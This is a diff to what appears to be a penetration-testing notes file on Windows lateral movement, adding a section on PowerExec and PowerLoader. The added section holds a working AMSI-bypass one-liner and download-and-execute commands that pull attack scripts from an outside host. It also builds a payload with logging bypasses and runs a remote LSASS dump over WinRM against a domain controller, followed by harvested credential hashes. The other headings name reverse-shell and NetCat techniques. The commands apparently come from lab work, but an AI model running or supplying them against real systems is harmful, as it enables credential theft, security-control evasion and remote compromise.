@@ -10,8 +10,9 @@ Index
 1. WMIexec (Impacket)
 2. PSexec (Sysinternals or Impacket)
 3. CrackMapExec 
-4. WMIexec (impacket) + Powershell (PowerCat.ps1) + NetCat
-5. SMBclient + VBS reverse shell + CrackMapExec (WMI) + NetCat
+4. PowerExec / PowerLoader
+5. WMIexec (impacket) + Powershell (PowerCat.ps1) + NetCat
+6. SMBclient + VBS reverse shell + CrackMapExec (WMI) + NetCat
 
 
 ========================================================================================================================
@@ -241,8 +242,113 @@ SeShutdownPrivilege
 <SNIP>
 
 
+
 ========================================================================================================================
-Example 4 - WMIexec (impacket) + Powershell (PowerCat.ps1) + NetCat
+Example 4 - PowerExec / PowerLoader
+========================================================================================================================
+
+Github link: https://github.com/tmenochet/PowerExec
+
+PowerExec combines various bypass techniques and execution methods for fileless lateral movement.
+> Invoke-PowerExec - It runs PowerShell script block on remote computers through various execution methods
+> New-PowerLoader  - It builds script block for in-memory execution of various payload types
+
+Bypass techniques can be specified with the '-bypass' parameter within the function New-PowerLoader:
+> AMSI	-  Bypass Antimalware Scan Interface via in-memory patching
+> ETW	-  Bypass Event Tracing for Windows via in-memory patching
+> SBL	-  Disable PowerShell Script Block Logging
+> PML	-  Disable PowerShell Module Logging
+
+
+PoC with a LSASS dump of a remote Windows server using WINRM + PowerExec + PowerLoader
+=======================================================================================
+
+C:\Users\Administrator>powershell -exec bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
+
+PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/PowerExec-master/PowerExec.ps1');
+PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/PowerExec-master/PowerLoader.ps1');
+
+PS C:\Users\Administrator> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/tmenochet/PowerDump/master/LsassDump.ps1' -ArgumentList 'Invoke-LsassDump' -Bypass AMSI,PML,SBL
+
+PS C:\Users\Administrator> Invoke-PowerExec -ScriptBlock $payload -Credential company\chuck.norris.adm  -Method WinRM -ComputerDomain dc1.company.work
+[DC1.company.work] Successful execution
+
+CloudAP failed: Object reference not set to an instance of an object.
+Dpapi failed: Index was out of range. Must be non-negative and less than the size of the collection.
+
+Parameter name: startIndex
+=====================================================================
+[*] LogonId:     0:3513540
+[*] LogonType:   Interactive
+[*] Session:     1
+[*] LogonTime:   2022-12-20 23:07:15
+[*] UserName:    chuck.norris.adm
+[*] SID:         S-1-5-21-844310393-2305947092-3799914435-1115
+[*] LogonDomain: COMPANY
+[*] LogonServer: DC1
+[*] Msv
+    DomainName: COMPANY
+    UserName:   chuck.norris.adm
+    NT:      3ea0dbb7f87c6eb4c2b9587bc<SNIP>
+    Sha1:    a4258357eb94e291af1d4161a<SNIP>
+    Dpapi:   9b1e063260d5a72ce3de2e3d7<SNIP>
+=====================================================================
+[*] LogonId:     0:42003
+[*] LogonType:   Interactive
+[*] Session:     1
+[*] LogonTime:   2022-12-20 23:05:05
+[*] UserName:    DWM-1
+[*] SID:         S-1-5-90-0-1
+[*] LogonDomain: Window Manager
+[*] Msv
+    DomainName: COMPANY
+    UserName:   DC1$
+    NT:      4ae8ac8c60a7ee7978c78d365b<SNIP>
+    Sha1:    c83e14ec7b3159032a9b1fe9b2<SNIP>
+[*] Kerberos
+    DomainName: company.work
+    UserName: DC1$
+    Password: ed c0 57 e0 fb 02 a8 b2 f9 e8 4c 91 e7 c2 0e e6 80 4f 25 0b 61 cc a8 a2 63 ce 63 3e 20 61 72 <SNIP>
+    NT: 4AE8AC8C60A7EE7978C78D365B<SNIP>
+=====================================================================
+[*] LogonId:     0:996
+[*] LogonType:   Service
+[*] Session:     0
+[*] LogonTime:   2022-12-20 23:05:05
+[*] UserName:    DC1$
+[*] SID:         S-1-5-20
+[*] LogonDomain: COMPANY
+[*] Msv
+    DomainName: COMPANY
+    UserName:   DC1$
+    NT:      4ae8ac8c60a7ee7978c78d36<SNIP>
+    Sha1:    c83e14ec7b3159032a9b1fe9<SNIP>
+=====================================================================
+[*] LogonId:     0:3513519
+[*] LogonType:   Interactive
+[*] Session:     1
+[*] LogonTime:   2022-12-20 23:07:15
+[*] UserName:    chuck.norris.adm
+[*] SID:         S-1-5-21-844310393-2305947092-3799914435-1115
+[*] LogonDomain: COMPANY
+[*] LogonServer: DC1
+[*] Msv
+    DomainName: COMPANY
+    UserName:   chuck.norris.adm
+    NT:      3ea0dbb7f87c6eb4c2b9587bc5<SNIP>
+    Sha1:    a4258357eb94e291af1d4161ae<SNIP>
+    Dpapi:   9b1e063260d5a72ce3de2e3d7e<SNIP>
+=====================================================================
+
+<SNIP>
+
+
+========================================================================================================================
+Example 5 - WMIexec (impacket) + Powershell (PowerCat.ps1) + NetCat
 ========================================================================================================================
 
 jeff@kali:~/Documents/CTFs/BadBlood$ wmiexec.py administrator@192.168.1.50 
@@ -295,7 +401,7 @@ C:\>
 
 
 ========================================================================================================================
-Example 5 - VBS reverse shell + SMBclient + CrackMapExec (WMI) + NetCat
+Example 6 - VBS reverse shell + SMBclient + CrackMapExec (WMI) + NetCat
 ========================================================================================================================
 
 jeff@kali:~/Documents/CTFs/BadBlood$ smbclient \\\\192.168.1.50\\C$ -U 'security-lab\\Administrator'
